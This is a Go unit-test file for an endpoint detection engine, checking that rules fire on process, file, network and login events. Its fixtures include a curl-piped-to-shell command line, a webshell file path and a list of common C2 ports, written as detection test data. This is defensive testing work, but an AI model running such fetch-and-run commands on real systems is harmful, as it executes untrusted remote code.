package detect

import (
	"testing"
	"time"

	"github.com/razatechofficial/edr/internal/rules"
	"github.com/razatechofficial/edr/internal/schema"
)

func TestEvaluateProcess(t *testing.T) {
	rs := rules.RuleSet{
		Version: "1",
		Rules: []rules.Rule{
			{
				ID:       "R1",
				Name:     "Temp execution",
				Severity: "high",
				When: rules.Condition{
					CommandLineContains: []string{"/tmp/"},
				},
			},
		},
	}
	e := NewEngine(rs)
	alerts := e.EvaluateProcess(schema.ProcessEvent{
		BaseEvent: schema.BaseEvent{
			SchemaVersion: schema.SchemaVersionV1,
			EventType:     schema.EventProcess,
			EndpointID:    "ep",
			Timestamp:     time.Now(),
		},
		ProcessName: "bash",
		ProcessPath: "/bin/sh",
		CommandLine: "/bin/sh /tmp/run.sh",
		PID:         123,
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert got %d", len(alerts))
	}
	if alerts[0].Score != 80 {
		t.Fatalf("unexpected score %d", alerts[0].Score)
	}
}

func TestEvaluateProcessCommandLineAll(t *testing.T) {
	rs := rules.RuleSet{
		Version: "1",
		Rules: []rules.Rule{
			{
				ID:       "R2",
				Name:     "Curl pipe shell",
				Severity: "critical",
				When: rules.Condition{
					CommandLineAll: []string{"curl", "| sh"},
				},
			},
		},
	}
	e := NewEngine(rs)
	alerts := e.EvaluateProcess(schema.ProcessEvent{
		BaseEvent: schema.BaseEvent{
			SchemaVersion: schema.SchemaVersionV1,
			EventType:     schema.EventProcess,
			EndpointID:    "ep",
			Timestamp:     time.Now(),
		},
		ProcessName: "sh",
		ProcessPath: "/bin/sh",
		CommandLine: "/bin/sh -c curl -fsSL https://x | sh",
		PID:         321,
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert got %d", len(alerts))
	}
}

func TestEvaluateFile(t *testing.T) {
	rs := rules.RuleSet{
		Version: "1",
		Rules: []rules.Rule{
			{
				ID:        "F1",
				Name:      "Webshell creation",
				Severity:  "critical",
				EventType: "file",
				When: rules.Condition{
					FilePathContains: []string{"/var/www/", "inetpub"},
					OperationIn:      []string{"create", "write"},
				},
			},
		},
	}
	e := NewEngine(rs)
	alerts := e.EvaluateFile(schema.FileEvent{
		BaseEvent: schema.BaseEvent{
			SchemaVersion: schema.SchemaVersionV1,
			EventType:     schema.EventFile,
			EndpointID:    "ep",
			Timestamp:     time.Now(),
		},
		Path:      "/var/www/html/shell.php",
		Operation: "create",
		ActorPID:  100,
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert got %d", len(alerts))
	}
	if alerts[0].FilePath != "/var/www/html/shell.php" {
		t.Fatalf("unexpected file path %s", alerts[0].FilePath)
	}
}

func TestEvaluateFilePathNotContains(t *testing.T) {
	rs := rules.RuleSet{
		Version: "1",
		Rules: []rules.Rule{
			{
				ID:        "F-tmp",
				Name:      "Temp drop",
				Severity:  "high",
				EventType: "file",
				When: rules.Condition{
					FilePathContains:    []string{"/tmp/"},
					FilePathNotContains: []string{".sock"},
					OperationIn:         []string{"create"},
				},
			},
		},
	}
	e := NewEngine(rs)
	alerts := e.EvaluateFile(schema.FileEvent{
		BaseEvent: schema.BaseEvent{
			SchemaVersion: schema.SchemaVersionV1,
			EventType:     schema.EventFile,
			EndpointID:    "ep",
			Timestamp:     time.Now(),
		},
		Path:      "/tmp/sandbox-proxy-12345.sock",
		Operation: "create",
		ActorPID:  1,
	})
	if len(alerts) != 0 {
		t.Fatalf("expected 0 alerts for .sock exclusion, got %d", len(alerts))
	}
}

func TestEvaluateNetwork(t *testing.T) {
	rs := rules.RuleSet{
		Version: "1",
		Rules: []rules.Rule{
			{
				ID:        "N1",
				Name:      "C2 port connection",
				Severity:  "high",
				EventType: "network",
				When: rules.Condition{
					DestPortIn: []int{4444, 5555, 8443},
				},
			},
		},
	}
	e := NewEngine(rs)
	alerts := e.EvaluateNetwork(schema.NetworkEvent{
		BaseEvent: schema.BaseEvent{
			SchemaVersion: schema.SchemaVersionV1,
			EventType:     schema.EventNetwork,
			EndpointID:    "ep",
			Timestamp:     time.Now(),
		},
		PID:      200,
		Protocol: "tcp",
		DestIP:   "10.0.0.1",
		DestPt:   4444,
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert got %d", len(alerts))
	}
	if alerts[0].DestPort != 4444 {
		t.Fatalf("unexpected dest port %d", alerts[0].DestPort)
	}
}

func TestEvaluateAuth(t *testing.T) {
	rs := rules.RuleSet{
		Version: "1",
		Rules: []rules.Rule{
			{
				ID:        "A1",
				Name:      "Root direct login",
				Severity:  "high",
				EventType: "auth",
				When: rules.Condition{
					SrcUserContains: []string{"root", "administrator"},
					AuthTypeIn:      []string{"interactive"},
				},
			},
		},
	}
	e := NewEngine(rs)
	alerts := e.EvaluateAuth(schema.AuthEvent{
		BaseEvent: schema.BaseEvent{
			SchemaVersion: schema.SchemaVersionV1,
			EventType:     schema.EventAuth,
			EndpointID:    "ep",
			Timestamp:     time.Now(),
		},
		User:     "root",
		Outcome:  "success",
		AuthType: "interactive",
		SourceIP: "192.168.1.10",
	})
	if len(alerts) != 1 {
		t.Fatalf("expected 1 alert got %d", len(alerts))
	}
	if alerts[0].User != "root" {
		t.Fatalf("unexpected user %s", alerts[0].User)
	}
}

func TestEvaluateProcessSkipsFileRules(t *testing.T) {
	rs := rules.RuleSet{
		Version: "1",
		Rules: []rules.Rule{
			{
				ID:        "F1",
				Name:      "File rule",
				Severity:  "high",
				EventType: "file",
				When: rules.Condition{
					FilePathContains: []string{"/tmp/"},
				},
			},
		},
	}
	e := NewEngine(rs)
	alerts := e.EvaluateProcess(schema.ProcessEvent{
		BaseEvent: schema.BaseEvent{
			SchemaVersion: schema.SchemaVersionV1,
			EventType:     schema.EventProcess,
			EndpointID:    "ep",
			Timestamp:     time.Now(),
		},
		ProcessName: "bash",
		CommandLine: "/tmp/evil",
		PID:         1,
	})
	if len(alerts) != 0 {
		t.Fatalf("expected 0 alerts (file rule should not match process events) got %d", len(alerts))
	}
}
